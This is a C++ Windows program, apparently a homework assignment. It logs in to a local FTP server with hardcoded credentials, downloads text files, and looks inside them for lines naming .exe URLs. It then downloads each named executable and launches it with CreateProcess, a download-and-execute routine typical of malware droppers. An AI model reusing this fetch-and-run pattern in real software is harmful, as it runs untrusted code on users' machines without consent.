#include "stdafx.h"
#include <Windows.h>
#include <Wininet.h>
#include <iostream>
#include <fstream>
#include <string>
#include <sstream>
#include <atlbase.h>
#include <atlconv.h>

#pragma comment(lib, "wininet.lib")

using namespace std;

std::string ws2s(const std::wstring& s)
{
	int len;
	int slength = (int)s.length() + 1;
	len = WideCharToMultiByte(CP_ACP, 0, s.c_str(), slength, 0, 0, 0, 0);
	char* buf = new char[len];
	WideCharToMultiByte(CP_ACP, 0, s.c_str(), slength, buf, len, 0, 0);
	std::string r(buf);
	delete[] buf;
	return r;
}

std::wstring s2ws(const std::string& s)
{
	int len;
	int slength = (int)s.length() + 1;
	len = MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, 0, 0);
	wchar_t* buf = new wchar_t[len];
	MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, buf, len);
	std::wstring r(buf);
	delete[] buf;
	return r;
}

void printMatchingLines(WCHAR fname[], HINTERNET hFTP)
{
	std::wstring ws(fname);
	wcout << ws << "<=====" << endl;
	std::string file_nam = ws2s(ws);
	std::string file_name = "..\\homework7_final\\" + file_nam;
	cout << file_name << endl;

	ifstream f(file_name);

	int counter = 0;
	for (string line; getline(f, line); )
	{
		size_t size = line.size();
		cout << "In file " << file_name << "first substrs " << line.substr(0, 4) << " and the second " << line.substr(size - 4, 4) << endl;
		if ((line.substr(0, 4) == "http") && (line.substr(size - 4, 4) == ".exe"))
		{
			// Now the download and running part of the homework. The executable should be downloaded and executed
			cout << "[INFO] Found matching line in file" << file_name << "at line " << line << endl;
			BOOL status = FtpGetFile(
				hFTP,
				s2ws(line).c_str(), // This may not be nice to memory
				s2ws(line).c_str(),
				TRUE,
				FILE_ATTRIBUTE_NORMAL,
				FTP_TRANSFER_TYPE_ASCII,
				NULL);
			
			PROCESS_INFORMATION ProcessInfo; 
			STARTUPINFO StartupInfo; 
			ZeroMemory(&StartupInfo, sizeof(StartupInfo));
			StartupInfo.cb = sizeof StartupInfo; 
			CreateProcess(s2ws("..\\homework7_final\\" + line).c_str(), NULL,
				NULL, NULL, FALSE, 0, NULL,
				NULL, &StartupInfo, &ProcessInfo);
		}
		counter++;
	}

	f.close();
}

int main()
{

	HINTERNET hInternet =  InternetOpen(NULL, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);

	if (hInternet == NULL)
	{
		cout << GetLastError() << endl;
		_tprintf(_T("An error has occured while trying to open the internet connection\n"));
		return 1;
	}

	HINTERNET hFTP = InternetConnect(
		hInternet,
		L"127.0.0.1",
		21,
		L"boss",
		L"876543211",
		INTERNET_SERVICE_FTP,
		INTERNET_FLAG_PASSIVE,
		NULL);

	if (hFTP == NULL)
	{
		cout << GetLastError() << endl;
		_tprintf(_T("Couldn't connect to the ftp server\n"));
		return 1;
	}

	_tprintf(_T("%d\n"), hFTP);

	WIN32_FIND_DATA fd;

	// here we should iterate over all the files in the ftp
	HINTERNET hFile = FtpFindFirstFile(hFTP, L".", &fd, INTERNET_FLAG_RELOAD, NULL);

	if (INVALID_HANDLE_VALUE == hFile) 
	{
		_tprintf(_T("Something went wrong ."));
	}

	do 
	{
		if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			_tprintf(_T("Dir\n"));
		}
		else
		{
			size_t len = wcslen(fd.cFileName);
			if (fd.cFileName[len - 1] == 't'
				&& fd.cFileName[len - 2] == 'x'
				&& fd.cFileName[len - 3] == 't'
				&& fd.cFileName[len - 4] == '.')
			{
				_tprintf(_T("One download candidate found\n"));

				BOOL status = FtpGetFile(
					hFTP,
					fd.cFileName,
					fd.cFileName,
					TRUE,
					FILE_ATTRIBUTE_NORMAL,
					FTP_TRANSFER_TYPE_ASCII,
					NULL);

				_tprintf(_T("%d\n"), status);
				printMatchingLines(fd.cFileName, hFTP);
			}
			_tprintf(_T("%s\n"), fd.cFileName);
		}
	} while (InternetFindNextFile(hFile, &fd));

	InternetCloseHandle(hFTP);
	InternetCloseHandle(hInternet);

    return 0;
}

